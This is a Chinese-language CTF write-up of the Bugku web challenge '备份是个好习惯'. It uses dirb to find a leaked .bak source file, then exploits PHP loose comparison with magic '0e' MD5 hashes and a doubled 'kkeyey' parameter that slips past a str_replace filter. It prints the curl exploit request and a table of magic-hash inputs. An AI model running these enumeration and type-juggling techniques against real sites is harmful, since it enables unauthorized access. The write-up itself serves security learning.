平台：Bugku
题目：备份是个好习惯
分类：WEB

打开题目所给靶机地址，页面只有一行内容：

    d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e

没有输入框、没有链接、没有 JS、没有注释。
通过题目名：**「备份是个好习惯」** 推测发生源码泄露
```
「备份」→ 开发者改代码前习惯留副本
      → 常见命名：
           index.php.bak      ← 备份
           index.php.old      ← 旧版
           index.php~         ← 编辑器临时文件
           index.php.swp      ← vim 交换文件
           .index.php.swp
           www.zip / www.tar.gz   ← 整站打包
```

## 利用kali虚拟机进行备份扫描
进入 Kali 环境

    # 在 Kali 桌面打开终端（Ctrl + Alt + T）
    # 确认在虚拟机里
    whoami          # → kali
    uname -a        # → Linux kali ...

先确认目标存活

    curl -s --max-time 15 http://160.202.254.160:14246/

用 dirb 扫描（Kali 自带）

    sudo su
    dirb http://160.202.254.160:14246/ -X .bak,.old,.swp,.zip

<img width="2032" height="1278" alt="Image" src="https://github.com/user-attachments/assets/b332f59b-04a9-4f86-ac95-eab45792f394" />

**完整源码（354 字节）：**

    <?php
    /**
     * Created by PhpStorm.
     * User: Norse
     * Date: 2017/8/6
     * Time: 20:22
     */
    
    include_once "flag.php";
    ini_set("display_errors", 0);
    $str = strstr($_SERVER['REQUEST_URI'], '?');
    $str = substr($str,1);
    $str = str_replace('key','',$str);
    parse_str($str);
    echo md5($key1);
    
    echo md5($key2);
    if(md5($key1) == md5($key2) && $key1 !== $key2){
        echo $flag."取得flag";
    }
    ?>

分析源码，我们得到能够得到flag的条件

if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}

**拆成两个条件：**

| 条件  | 运算符 | 含义  | 要求  |
| --- | --- | --- | --- |
| `md5($key1) == md5($key2)` | **`==`** 弱比较 | 只比值，**会先转类型** | 两个哈希"相等" |
| `$key1 !== $key2` | **`!==`** 严格不等 | 类型和值都要一样才算等 | 两个**原始串必须不同** |

**两个都成立才给 flag。**

于是我们想到了 PHP `==` 弱比较 —— "0e 魔术哈希"

#### ★ 0e 魔术哈希速查

| 字符串 | 它的 MD5 |
| --- | --- |
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `s878926199a` | `0e545993274517709034328855841020` |
| `s155964671a` | `0e342768416822451524974117254469` |
| `s214587387a` | `0e848240448830537924465865611904` |
| `s1885207154a` | `0e509367213418206700842008763514` |
| `s1836677006a` | `0e481036490867661113260034900752` |
| `s1091221200a` | `0e940624217856561557816327384675` |

在得到能够得到flag的条件及其成立方式后，我们进行发送请求得到flag

    curl -s "http://160.202.254.160:14246/?kkeyey1=240610708&kkeyey2=QNKCDZO"

<img width="2658" height="388" alt="Image" src="https://github.com/user-attachments/assets/09d1edcb-eaf4-46de-ba4b-e23e3f234fc1" />

得到flag后，提交flag，flag正确，完活。








